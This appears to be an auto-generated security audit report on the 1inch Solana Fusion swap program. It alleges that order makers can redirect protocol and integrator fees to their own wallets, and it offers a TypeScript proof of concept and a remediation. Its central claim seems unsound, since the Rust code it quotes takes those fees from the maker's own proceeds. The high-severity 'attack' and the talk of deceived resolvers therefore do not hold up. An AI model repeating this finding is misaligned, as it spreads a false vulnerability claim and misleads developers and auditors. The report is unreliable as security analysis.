# Audit Report

## Title
Fee Recipient Manipulation: Arbitrary Control of Protocol and Integrator Fee Destination Addresses

## Summary
Order makers can set `protocolDstAcc` and `integratorDstAcc` to arbitrary addresses they control during order creation, causing protocol and integrator fees to be siphoned to attacker-controlled addresses instead of legitimate protocol/integrator recipients. This vulnerability exists due to lack of validation on fee recipient addresses.

## Finding Description
The 1inch Solana Fusion Protocol allows order makers to specify fee recipient addresses (`protocolDstAcc` and `integratorDstAcc`) without any validation of ownership or authorization. These addresses are defined as unchecked accounts in the program. [1](#0-0) 

The only validation performed during order creation checks whether these accounts are provided when fees are non-zero, but does not verify the addresses belong to legitimate protocol or integrator entities: [2](#0-1) 

During order filling, fees calculated from the taker's payment are transferred directly to these unvalidated addresses: [3](#0-2) 

**Attack Scenario:**
1. Attacker creates an order specifying their own wallet addresses for `protocolDstAcc` (e.g., attacker_wallet_1) and `integratorDstAcc` (e.g., attacker_wallet_2)
2. Attacker sets `protocolFee = 10000` (10% in basis points) and `integratorFee = 5000` (5%)
3. Order is included in the order hash, committing these addresses [4](#0-3) 
4. When a legitimate resolver fills the order, they pay fees from their `dst` tokens
5. 10% goes to attacker_wallet_1 (instead of protocol)
6. 5% goes to attacker_wallet_2 (instead of integrator)
7. The attacker extracts value through fabricated "protocol fees" paid by resolvers

The fee calculation logic shows these fees are deducted from the taker's payment: [5](#0-4) 

This breaks the **Fee Correctness** invariant, as funds are not distributed to their intended recipients (protocol and integrators), but instead to attacker-controlled addresses.

## Impact Explanation
**High Severity** - This vulnerability allows:

1. **Systematic protocol revenue loss**: Attackers can create orders with protocol fees directed to themselves, denying the protocol its legitimate fee revenue
2. **Integrator impersonation**: Malicious actors can set integrator addresses to their own wallets, siphoning integrator fees
3. **User deception**: Orders appear to have legitimate protocol/integrator fees, but these go to the order maker, misleading resolvers and frontend applications
4. **Widespread exploitation**: Every order created by malicious makers can exploit this, affecting the entire protocol
5. **No privileged access required**: Any user can create orders and execute this attack

While this doesn't directly steal existing escrowed funds, it enables systematic extraction of fees that should go to the protocol and integrators, potentially amounting to significant value over time.

## Likelihood Explanation
**High Likelihood**:

- **Easy to execute**: Requires only creating an order with custom fee recipient addresses
- **No special permissions**: Any user with tokens can create malicious orders
- **Difficult to detect**: Orders look legitimate on-chain; only off-chain analysis would reveal fee recipients are not official protocol addresses
- **Economic incentive**: Attackers can earn protocol/integrator fees on their own orders
- **No runtime checks**: The protocol performs no validation preventing this attack

The attack would likely occur frequently once discovered, as it provides direct economic benefit to order makers at the expense of legitimate protocol revenue.

## Recommendation
Implement a whitelist or registry of authorized protocol and integrator addresses. Modify the `create()` function to validate that provided fee recipient addresses match authorized addresses:

**Option 1: Protocol-Controlled Fee Recipients**
```rust
// Add to program state
#[account]
pub struct ProtocolConfig {
    pub authority: Pubkey,
    pub protocol_fee_recipient: Pubkey,
    // Optionally maintain a mapping of authorized integrators
}

// In create() function, add validation:
if order.fee.protocol_fee > 0 || order.fee.surplus_percentage > 0 {
    let protocol_config = &ctx.accounts.protocol_config;
    require!(
        ctx.accounts.protocol_dst_acc.as_ref().map(|acc| acc.key()) 
            == Some(protocol_config.protocol_fee_recipient),
        FusionError::UnauthorizedProtocolFeeRecipient
    );
}
```

**Option 2: Zero Protocol Fees for Arbitrary Recipients**
If allowing user-specified recipients is desired, restrict protocol/integrator fees to zero when non-standard addresses are used, or clearly mark such orders as "custom fee" orders in metadata.

**Option 3: Integrator Registry**
Maintain an on-chain registry of authorized integrators that can be updated by protocol governance, and validate integrator addresses against this registry.

## Proof of Concept

**Setup Steps:**
1. Deploy the fusion-swap program to a test cluster
2. Create two wallet addresses: `attacker_protocol_wallet` and `attacker_integrator_wallet`
3. Fund a maker wallet and a resolver wallet with test tokens

**Exploitation Steps:**

```typescript
// Step 1: Attacker creates order with malicious fee recipients
const attackerProtocolWallet = Keypair.generate();
const attackerIntegratorWallet = Keypair.generate();

const maliciousOrder = await create(
  connection,
  fusionSwapProgram,
  makerKeypair,
  new BN(1000 * 10**6), // 1000 USDC
  new BN(900 * 10**6),  // min 900 USDC out
  srcMint,
  dstMint,
  orderId,
  defaultExpirationTime(),
  makerKeypair.publicKey,
  false,
  false,
  {
    protocolFee: 10000,      // 10% "protocol fee" 
    integratorFee: 5000,     // 5% "integrator fee"
    surplusPercentage: 0,
    maxCancellationPremium: new BN(0)
  },
  attackerProtocolWallet.publicKey,    // Attacker's address!
  attackerIntegratorWallet.publicKey,  // Attacker's address!
);

// Step 2: Legitimate resolver fills the order
// (Resolver expects fees to go to protocol/integrator)
await fill(
  connection,
  fusionSwapProgram,
  whitelistProgramId,
  resolverKeypair,
  makerKeypair.publicKey,
  1000,
  orderConfig,
  reducedOrderConfig
);

// Step 3: Verify attacker received the fees
const attackerProtocolBalance = await connection.getTokenAccountBalance(
  await getAssociatedTokenAddress(dstMint, attackerProtocolWallet.publicKey)
);
const attackerIntegratorBalance = await connection.getTokenAccountBalance(
  await getAssociatedTokenAddress(dstMint, attackerIntegratorWallet.publicKey)
);

// Attacker now has ~10% + 5% = 15% of filled amount in their wallets
// instead of legitimate protocol/integrator addresses
console.log("Attacker protocol wallet received:", attackerProtocolBalance.value.uiAmount);
console.log("Attacker integrator wallet received:", attackerIntegratorBalance.value.uiAmount);
```

**Expected Result:** The attacker's wallets receive the protocol and integrator fees, confirming the vulnerability.

**Note:** This can be tested using the existing test infrastructure by modifying `tests/suits/fusion-swap.ts` to create an order with arbitrary fee recipient addresses and verifying those addresses receive the fees during fill execution.

## Notes

The vulnerability stems from the design decision to make fee recipient addresses part of the order configuration rather than global protocol parameters. While this provides flexibility, it breaks the fundamental assumption that "protocol fees" go to the protocol. The test suite contains cases for wrong addresses (lines 1359-1387 in `tests/suits/fusion-swap.ts`), but these only verify that addresses must match the order hash, not that they must be legitimate protocol addresses. [6](#0-5) [7](#0-6)

### Citations

**File:** programs/fusion-swap/src/lib.rs (L76-87)
```rust
        // Iff protocol fee or surplus is positive, protocol_dst_acc must be set
        require!(
            (order.fee.protocol_fee > 0 || order.fee.surplus_percentage > 0)
                == ctx.accounts.protocol_dst_acc.is_some(),
            FusionError::InconsistentProtocolFeeConfig
        );

        // Iff integrator fee is positive, integrator_dst_acc must be set
        require!(
            (order.fee.integrator_fee > 0) == ctx.accounts.integrator_dst_acc.is_some(),
            FusionError::InconsistentIntegratorFeeConfig
        );
```

**File:** programs/fusion-swap/src/lib.rs (L231-263)
```rust
        // Take protocol fee
        if protocol_fee_amount > 0 {
            match &mut params {
                UniTransferParams::NativeTransfer { amount, to, .. }
                | UniTransferParams::TokenTransfer { amount, to, .. } => {
                    *amount = protocol_fee_amount;
                    *to = ctx
                        .accounts
                        .protocol_dst_acc
                        .as_ref()
                        .ok_or(FusionError::InconsistentProtocolFeeConfig)?
                        .to_account_info();
                }
            }
            uni_transfer(&params)?;
        }

        // Take integrator fee
        if integrator_fee_amount > 0 {
            match &mut params {
                UniTransferParams::NativeTransfer { amount, to, .. }
                | UniTransferParams::TokenTransfer { amount, to, .. } => {
                    *amount = integrator_fee_amount;
                    *to = ctx
                        .accounts
                        .integrator_dst_acc
                        .as_ref()
                        .ok_or(FusionError::InconsistentIntegratorFeeConfig)?
                        .to_account_info();
                }
            }
            uni_transfer(&params)?;
        }
```

**File:** programs/fusion-swap/src/lib.rs (L499-501)
```rust
    protocol_dst_acc: Option<UncheckedAccount<'info>>,

    integrator_dst_acc: Option<UncheckedAccount<'info>>,
```

**File:** programs/fusion-swap/src/lib.rs (L745-762)
```rust
fn order_hash(
    order: &OrderConfig,
    protocol_dst_acc: Option<Pubkey>,
    integrator_dst_acc: Option<Pubkey>,
    src_mint: Pubkey,
    dst_mint: Pubkey,
    receiver: Pubkey,
) -> Result<[u8; 32]> {
    Ok(hashv(&[
        &order.try_to_vec()?,
        &protocol_dst_acc.try_to_vec()?,
        &integrator_dst_acc.try_to_vec()?,
        &src_mint.to_bytes(),
        &dst_mint.to_bytes(),
        &receiver.to_bytes(),
    ])
    .to_bytes())
}
```

**File:** programs/fusion-swap/src/lib.rs (L784-814)
```rust
fn get_fee_amounts(
    integrator_fee: u16,
    protocol_fee: u16,
    surplus_percentage: u8,
    dst_amount: u64,
    estimated_dst_amount: u64,
) -> Result<(u64, u64, u64)> {
    let integrator_fee_amount = dst_amount
        .mul_div_floor(integrator_fee as u64, BASE_1E5)
        .ok_or(ProgramError::ArithmeticOverflow)?;

    let mut protocol_fee_amount = dst_amount
        .mul_div_floor(protocol_fee as u64, BASE_1E5)
        .ok_or(ProgramError::ArithmeticOverflow)?;

    let actual_dst_amount = (dst_amount - protocol_fee_amount)
        .checked_sub(integrator_fee_amount)
        .ok_or(ProgramError::ArithmeticOverflow)?;

    if actual_dst_amount > estimated_dst_amount {
        protocol_fee_amount += (actual_dst_amount - estimated_dst_amount)
            .mul_div_floor(surplus_percentage as u64, BASE_1E2)
            .ok_or(ProgramError::ArithmeticOverflow)?;
    }

    Ok((
        protocol_fee_amount,
        integrator_fee_amount,
        dst_amount - integrator_fee_amount - protocol_fee_amount,
    ))
}
```

**File:** scripts/fusion-swap/create.ts (L46-47)
```typescript
  protocolDstAcc: PublicKey = null,
  integratorDstAcc: PublicKey = null,
```

**File:** scripts/utils.ts (L23-30)
```typescript
export type FeeConfig = {
  protocolDstAcc: anchor.web3.PublicKey | null;
  integratorDstAcc: anchor.web3.PublicKey | null;
  protocolFee: number;
  integratorFee: number;
  surplusPercentage: number;
  maxCancellationPremium: anchor.BN;
};
```
